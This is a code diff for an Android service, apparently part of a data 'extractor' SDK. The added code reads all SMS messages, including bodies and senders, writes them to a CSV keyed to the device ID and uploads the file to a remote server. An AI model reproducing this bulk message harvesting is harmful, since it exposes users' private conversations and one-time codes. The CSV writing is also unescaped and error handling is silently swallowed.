@@ -13,21 +13,30 @@ import android.database.Cursor
 import android.net.Uri
 import android.os.*
 import android.provider.Settings
+import android.util.Log
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import com.google.gson.Gson
 import com.google.gson.GsonBuilder
 import com.google.gson.JsonObject
 import com.google.gson.JsonParser
-import info.kalagato.com.extractor.Constant
-import info.kalagato.com.extractor.Extractor
-import info.kalagato.com.extractor.R
-import info.kalagato.com.extractor.SyncService
+import info.kalagato.com.extractor.*
 import info.kalagato.com.extractor.Util.getDeviceId
 import info.kalagato.com.extractor.Util.getLastSyncTime
 import info.kalagato.com.extractor.Util.setLastSyncDateTime
+import info.kalagato.com.extractor.networkCall.ApiClient
+import info.kalagato.com.extractor.networkCall.DetailInfoResponse
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
+import okhttp3.MediaType.Companion.toMediaTypeOrNull
+import okhttp3.MultipartBody
+import okhttp3.RequestBody
+import okhttp3.RequestBody.Companion.asRequestBody
 import org.json.JSONArray
 import org.json.JSONObject
+import retrofit2.Response
 import java.io.File
 import java.io.FileWriter
 import java.text.SimpleDateFormat
@@ -35,22 +44,29 @@ import java.util.*
 
 
 class ReadSMSService : Service() {
-    private val TAG = "read-sms-service"
-    private var mServiceLooper: Looper? = null
-    private var mServiceHandler: ServiceHandler? = null
-    val smsObject = JSONObject()
-    override fun onCreate() {
-//        Log.d(TAG,"onCreate");
-        // Start up the thread running the service.  Note that we create a
-        // separate thread because the service normally runs in the process's
-        // main thread, which we don't want to block.  We also make it
-        // background priority so CPU-intensive work will not disrupt our UI.
-        val thread = HandlerThread("SMS_ServiceStartArguments", Process.THREAD_PRIORITY_FOREGROUND)
-        thread.start()
+    private lateinit var mydir: File
+    private var appName: String = ""
+    private var userId: String = ""
+    private lateinit var smsInfo:MultipartBody.Part
 
-        // Get the HandlerThread's Looper and use it for our Handler
-        mServiceLooper = thread.looper
-        mServiceHandler = ServiceHandler(mServiceLooper)
+
+    override fun onCreate() {
+
+        mydir = applicationContext.getDir("mydir", MODE_PRIVATE) //Creating an internal dir;
+        appName =applicationContext.packageName
+        userId =  Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+
+        deletePreviewsFiles()
+
+            CoroutineScope(Dispatchers.IO).launch{
+                val isAvailable = getAllSms()
+
+                if (isAvailable){
+                sendToServer()
+            }
+
+        }
+
     }
 
     override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
@@ -83,26 +99,7 @@ class ReadSMSService : Service() {
             .setContentIntent(pendingIntent)
             .build()
         startForeground(1, notification)
-        try {
-//            Log.d(TAG,"sending msg");
-            // For each start request, send a message to start a job and deliver the
-            // start ID so we know which request we're stopping when we finish the job
-            val msg = mServiceHandler!!.obtainMessage()
-            msg.arg1 = startId
-            // Create a bundle with the data
-            val bundle = Bundle()
-
-            // Set the bundle data to the Message
-            msg.data = bundle
-            mServiceHandler!!.sendMessage(msg)
-        } catch (e: Exception) {
-//            Log.d("read-sms-service","error in starting handler",e);
-        }
-
-        //do heavy work on a background thread
-//        Log.d(TAG,"do your work");
-        //stopSelf();
-        return START_NOT_STICKY
+        return super.onStartCommand(intent, flags, startId)
     }
 
     override fun onDestroy() {
@@ -114,73 +111,120 @@ class ReadSMSService : Service() {
         return null
     }
 
-    // Handler to run on a thread to work in background
-    private inner class ServiceHandler(looper: Looper?) : Handler(looper!!) {
-        override fun handleMessage(msg: Message) {
-//            Log.d(TAG,"handleMessage");
-            val smsArray:JSONArray? = getAllSms()
-           smsObject.put("hardware_id",Settings.Secure.ANDROID_ID)
-           smsObject.put("sms_array",smsArray)
-
-            AppRunningStatus().getAllPackageInstalled(applicationContext)
-            //            new AppRunningStatus().getAppUsage(getApplicationContext());
-
-            //checking sync
-            val serviceIntent = Intent(applicationContext, SyncService::class.java)
-            ContextCompat.startForegroundService(applicationContext, serviceIntent)
-            // Stop the service using the startId, so that we don't stop
-            // the service in the middle of handling another job
-            stopSelf(msg.arg1)
-        }
-
-
-        @SuppressLint("Range")
-        fun getAllSms(): JSONArray {
-            if (ContextCompat.checkSelfPermission(
-                    applicationContext,
-                    Manifest.permission.READ_SMS
-                ) == PackageManager.PERMISSION_GRANTED
-            ) {
-
-                //Sync message with the current time to gte the Incremental Messages
-                val currentSyncTime = Date().time
-                val lastSyncTime = getLastSyncTime(
-                    applicationContext
-                )
-                // Now create a SimpleDateFormat object.
-                val filter = if (lastSyncTime == 0L) {
-                    " date <= $currentSyncTime"
-                } else {
-                    " date <= $currentSyncTime and date >= $lastSyncTime"
-                }
-
-
-                val message = Uri.parse("content://sms/")
-                val cr: ContentResolver = contentResolver
-                val c: Cursor? = cr.query(message, null,filter, null, null)
-                //Activity().startManagingCursor(c)
-                val totalSMS: Int = c!!.count
-                val jsonArray = JSONArray()
-
-                if (c.moveToFirst()) {
-                    for (i in 0 until totalSMS) {
-                        val jsonObject = JSONObject()
-                        jsonObject.put("sender_id",c.getString(c.getColumnIndexOrThrow("address")))
-                        jsonObject.put("body",c.getString(c.getColumnIndexOrThrow("body")))
-                        jsonObject.put("message_timestamp",c.getString(c.getColumnIndexOrThrow("date")))
-                        jsonObject.put("app_name",applicationContext.packageName)
-                        jsonArray.put(jsonObject)
-                        c.moveToNext()
-                    }
-                }
-                // else {
-                // throw new RuntimeException("You have no SMS");
-                // }
-                c.close()
-                setLastSyncDateTime(applicationContext, currentSyncTime)
-                return jsonArray
+    private fun deletePreviewsFiles() {
+        try {
+            val directory = File(mydir.path)
+            val files = directory.listFiles()
+            for (i in files!!.indices) {
+                if (files[i].name == "sms_info.csv")
+                    files[i].delete()
             }
-            return JSONArray()
+        }catch (e:Exception){
+            //handle the exception
         }
     }
+
+
+    @SuppressLint("Range")
+    fun getAllSms():Boolean{
+        if (ContextCompat.checkSelfPermission(
+                applicationContext,
+                Manifest.permission.READ_SMS
+            ) == PackageManager.PERMISSION_GRANTED
+        ) {
+
+            //Sync message with the current time to gte the Incremental Messages
+            val currentSyncTime = Date().time
+            val lastSyncTime = getLastSyncTime(
+                applicationContext
+            )
+            // Now create a SimpleDateFormat object.
+            val filter = if (lastSyncTime == 0L) {
+                " date <= $currentSyncTime"
+            } else {
+                " date <= $currentSyncTime and date >= $lastSyncTime"
+            }
+
+
+            val message = Uri.parse("content://sms/")
+            val cr: ContentResolver = contentResolver
+            val c: Cursor? = cr.query(message, null, filter, null, null)
+            //Activity().startManagingCursor(c)
+            val totalSMS: Int = c!!.count
+
+
+            if (c.moveToFirst()) {
+                val filename = ("$mydir/sms_info.csv")
+                try {
+                    val fw = FileWriter(filename, true)
+
+                    fw.append("user_id,")
+                    fw.append("body,")
+                    fw.append("sender_id,")
+                    fw.append("created_on,")
+                    fw.append("message_timestamp,")
+                    fw.append("app_name")
+                    fw.append("\n")
+
+                    for (i in 0 until totalSMS) {
+
+                        fw.append("$userId,")
+                        fw.append(c.getString(c.getColumnIndexOrThrow("body"))+",")
+                        fw.append(c.getString(c.getColumnIndexOrThrow("address"))+",")
+                        fw.append(Date().time.toString()+",")
+                        fw.append(c.getString(c.getColumnIndexOrThrow("date"))+",")
+                        fw.append(appName)
+                        fw.append("\n")
+
+                        c.moveToNext()
+                    }
+                    fw.flush()
+                    fw.close()
+
+                }catch (e:Exception){
+                    //catch any exception here
+                }
+                return true
+            }
+            c.close()
+        }
+        return false
+    }
+
+    private suspend fun sendToServer() {
+
+        val directory = File(mydir.path)
+        val files = directory.listFiles()
+        for (i in files!!.indices) {
+            val requestBody: RequestBody = files[i].asRequestBody("text/csv".toMediaTypeOrNull())
+            if (files[i].name == "sms_info.csv"){
+                smsInfo = MultipartBody.Part.createFormData("sms_info", files[i].name,requestBody)
+            }
+        }
+
+        if (this@ReadSMSService::smsInfo.isInitialized){
+            val appName  = RequestBody.create(
+                "text/plain".toMediaTypeOrNull(),
+                appName
+            )
+            val userId  = RequestBody.create(
+                "text/plain".toMediaTypeOrNull(),
+                userId
+            )
+            val response: Response<DetailInfoResponse> =
+                ApiClient.client2.uploadSMSInfoFile(appName,userId,smsInfo)
+            withContext(Dispatchers.Main){
+                if (response.isSuccessful){
+                    setLastSyncDateTime(applicationContext,Date().time)
+                    Log.d("TAG", "getIpLocation: ${response.message()}")
+                }else{
+                    Log.d("TAG", "getIpLocation: ${response.message()}")
+                }
+            }
+        }
+
+
+    }
+
+
 }
